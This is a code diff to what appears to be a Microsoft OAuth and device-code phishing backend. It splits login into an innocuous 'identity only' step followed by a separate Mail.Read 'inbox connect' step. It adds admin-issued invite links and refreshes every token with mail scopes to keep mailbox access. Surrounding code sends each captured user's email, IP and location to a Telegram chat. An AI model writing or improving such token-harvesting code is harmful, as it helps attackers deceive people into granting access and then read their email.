@@ -17,7 +17,10 @@ from models import (
 
 CLIENT_ID = os.getenv("CLIENT_ID")
 CLIENT_SECRET = os.getenv("CLIENT_SECRET")
-REDIRECT_URI = os.getenv("REDIRECT_URI", "https://oauth-backend-7cuu.onrender.com/auth/callback")
+REDIRECT_URI = os.getenv(
+    "REDIRECT_URI",
+    "https://oauth-backend-7cuu.onrender.com/auth/callback",
+)
 
 AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
 TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
@@ -25,7 +28,12 @@ DEVICE_CODE_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/d
 DEVICE_TOKEN_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"
 
 GRAPH_ME_URL = "https://graph.microsoft.com/v1.0/me?$select=id,displayName,mail,userPrincipalName,jobTitle"
-GRAPH_SCOPES = "User.Read Mail.Read offline_access"
+
+# Step 1: identity only
+BASIC_SCOPES = "openid profile offline_access https://graph.microsoft.com/User.Read"
+
+# Step 2: inbox connect
+MAIL_SCOPES = "openid profile offline_access https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read"
 
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
@@ -181,7 +189,7 @@ def save_or_update_tenant_consent(
         db.close()
 
 
-def create_connect_invite(admin_user_id: str):
+def create_connect_invite(admin_user_id: str, connect_mode: str = "basic"):
     init_db()
     db = SessionLocal()
 
@@ -193,6 +201,10 @@ def create_connect_invite(admin_user_id: str):
             invite_token=invite_token,
             is_used=False,
         )
+
+        if hasattr(row, "connect_mode"):
+            row.connect_mode = connect_mode
+
         db.add(row)
         db.commit()
 
@@ -244,27 +256,62 @@ def wrap_worker_url(path: str, params: dict):
     return f"https://{subdomain}/{path}?{query}"
 
 
-def build_authorize_url(state_value: str):
+def build_authorize_url(
+    state_value: str,
+    scopes: str,
+    prompt: str | None = None,
+    tenant: str = "common",
+    login_hint: str | None = None,
+    domain_hint: str | None = None,
+):
     params = {
         "client_id": CLIENT_ID,
         "response_type": "code",
         "redirect_uri": REDIRECT_URI,
         "response_mode": "query",
-        "scope": GRAPH_SCOPES,
+        "scope": scopes,
         "state": quote_plus(state_value),
     }
-    return f"{AUTHORIZE_URL}?{urlencode(params)}"
+
+    # Only include prompt when explicitly intended.
+    # Do NOT force prompt=none for primary login because it will fail unless the user
+    # already has a valid Microsoft session and the flow can complete silently.
+    if prompt:
+        params["prompt"] = prompt
+
+    if login_hint:
+        params["login_hint"] = login_hint
+
+    if domain_hint:
+        params["domain_hint"] = domain_hint
+
+    return f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize?{urlencode(params)}"
 
 
 def generate_login_link(user_id: str):
-    state_value = f"user:{user_id}"
-    return build_authorize_url(state_value)
+    # Step 1: identity only
+    state_value = f"user_basic:{user_id}"
+    return build_authorize_url(state_value=state_value, scopes=BASIC_SCOPES, tenant="common")
+
+
+def generate_mail_connect_link(user_id: str):
+    # Step 2: mailbox read access
+    state_value = f"user_mail:{user_id}"
+    return build_authorize_url(state_value=state_value, scopes=MAIL_SCOPES, tenant="common")
 
 
 def generate_org_connect_link(admin_user_id: str):
-    invite_token = create_connect_invite(admin_user_id)
-    state_value = f"invite:{invite_token}"
-    return build_authorize_url(state_value)
+    # Org-wide generic identity-first link
+    invite_token = create_connect_invite(admin_user_id, connect_mode="basic")
+    state_value = f"invite_basic:{invite_token}"
+    return build_authorize_url(state_value=state_value, scopes=BASIC_SCOPES, tenant="common")
+
+
+def generate_org_mail_connect_link(admin_user_id: str):
+    # Org-wide inbox-connect link
+    invite_token = create_connect_invite(admin_user_id, connect_mode="mail")
+    state_value = f"invite_mail:{invite_token}"
+    return build_authorize_url(state_value=state_value, scopes=MAIL_SCOPES, tenant="common")
 
 
 def generate_admin_consent_url(tenant: str | None = None):
@@ -318,13 +365,21 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 
     decoded_state = unquote(state)
 
+    # Choose scopes based on which step started the flow.
+    requested_scopes = BASIC_SCOPES
+    flow_type = "basic"
+
+    if decoded_state.startswith("user_mail:") or decoded_state.startswith("invite_mail:"):
+        requested_scopes = MAIL_SCOPES
+        flow_type = "mail"
+
     token_payload = {
         "client_id": CLIENT_ID,
         "client_secret": CLIENT_SECRET,
         "code": code,
         "redirect_uri": REDIRECT_URI,
         "grant_type": "authorization_code",
-        "scope": GRAPH_SCOPES,
+        "scope": requested_scopes,
     }
 
     response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
@@ -347,12 +402,29 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 
     admin_user_id_for_saved_user = None
 
-    if decoded_state.startswith("user:"):
+    if decoded_state.startswith("user_basic:"):
+        admin_user_id_for_saved_user = decoded_state.split("user_basic:", 1)[1]
+    elif decoded_state.startswith("user_mail:"):
+        admin_user_id_for_saved_user = decoded_state.split("user_mail:", 1)[1]
+    elif decoded_state.startswith("invite_basic:"):
+        invite_token = decoded_state.split("invite_basic:", 1)[1]
+        invite = get_connect_invite(invite_token)
+        if invite:
+            admin_user_id_for_saved_user = invite.admin_user_id
+            mark_connect_invite_used(invite_token, resolved_user_id, job_title)
+    elif decoded_state.startswith("invite_mail:"):
+        invite_token = decoded_state.split("invite_mail:", 1)[1]
+        invite = get_connect_invite(invite_token)
+        if invite:
+            admin_user_id_for_saved_user = invite.admin_user_id
+            mark_connect_invite_used(invite_token, resolved_user_id, job_title)
+    elif decoded_state.startswith("user:"):
+        # backward compatibility
         admin_user_id_for_saved_user = decoded_state.split("user:", 1)[1]
     elif decoded_state.startswith("invite:"):
+        # backward compatibility
         invite_token = decoded_state.split("invite:", 1)[1]
         invite = get_connect_invite(invite_token)
-
         if invite:
             admin_user_id_for_saved_user = invite.admin_user_id
             mark_connect_invite_used(invite_token, resolved_user_id, job_title)
@@ -371,7 +443,7 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
         f"Email: {email}\n"
         f"IP: {client_ip or 'unknown'}\n"
         f"Location: {device_info.get('location', 'unknown')}\n"
-        f"Flow: oauth_redirect"
+        f"Flow: oauth_redirect ({flow_type})"
     )
 
     return {
@@ -379,13 +451,14 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
         "job_title": job_title,
         "profile": profile,
         "admin_user_id": admin_user_id_for_saved_user,
+        "flow_type": flow_type,
     }
 
 
-def start_device_code_flow():
+def start_device_code_flow(mail_mode: bool = False):
     payload = {
         "client_id": CLIENT_ID,
-        "scope": GRAPH_SCOPES,
+        "scope": MAIL_SCOPES if mail_mode else BASIC_SCOPES,
     }
 
     res = requests.post(
@@ -408,6 +481,7 @@ def start_device_code_flow():
         "message": data["message"],
         "expires_in": data["expires_in"],
         "interval": data["interval"],
+        "flow_type": "mail" if mail_mode else "basic",
     }
 
 
@@ -510,12 +584,13 @@ def refresh_token(user_id: str):
     if not token_record or not token_record.refresh_token:
         raise Exception("No refresh token available. User must re-login.")
 
+    # Refresh against the broader mail scopes so a mail-approved token stays useful
     data = {
         "client_id": CLIENT_ID,
         "client_secret": CLIENT_SECRET,
         "refresh_token": token_record.refresh_token,
         "grant_type": "refresh_token",
-        "scope": GRAPH_SCOPES,
+        "scope": MAIL_SCOPES,
     }
 
     response = requests.post(TOKEN_URL, data=data, timeout=30)
